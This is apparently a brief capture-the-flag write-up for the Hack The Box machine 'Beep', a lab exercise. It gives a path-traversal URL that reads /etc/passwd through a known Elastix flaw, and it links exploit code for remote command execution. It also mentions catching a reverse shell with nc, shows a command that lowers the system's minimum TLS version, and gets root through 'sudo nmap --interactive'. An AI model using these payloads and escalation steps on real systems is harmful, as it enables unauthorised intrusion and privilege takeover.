---
title: Beep (Hack The Box Writeup)
date: 2021-09-05T13:40:00+08:00
draft: false
url: "/2021/09/05/beep-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

> 
URL : https://app.hackthebox.eu/machines/Beep

IP : 10.129.1.226

## Recon

- 80 port is a login pageElastix![](/uploads/2022/02/a5695-4GmV8sk.png)

## Find Payload

### LFI

- Elastix 2.2.0 - 'graph.php' Local File Inclusionhttps://www.exploit-db.com/exploits/37637Try LFI- https://10.129.1.226/vtigercrm/graph.php?current_language=../../../../../../../etc/passwd%00&module=Accounts&action
- ![](/uploads/2022/02/4e153-pgsp4Xx.png)With python request script, it will throw a exception, because the ssl version is toooo ol.- https://stackoverflow.com/questions/32330919/python-ssl-ssl-sslerror-ssl-unsupported-protocol-unsupported-protocol-ssl
- Use this command to change the min version of TLS`sed -i 's/MinProtocol = TLSv1.2/MinProtocol = TLSv1.0/' /etc/ssl/openssl.cnf`
- ![](/uploads/2022/02/aec40-2GDgN7e.png)

### RCE

- Find RCE Codehttps://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution/blob/master/exploit.pyTurn nc to receive reverse shell- ![](/uploads/2022/02/6b91e-5RWwCTM.png)

## Privilege Escalation

- `sudo -l` check , we can sudo `nmap`![](/uploads/2022/02/e15ab-vhDoZgm.png)`sudo nmap --interactive`
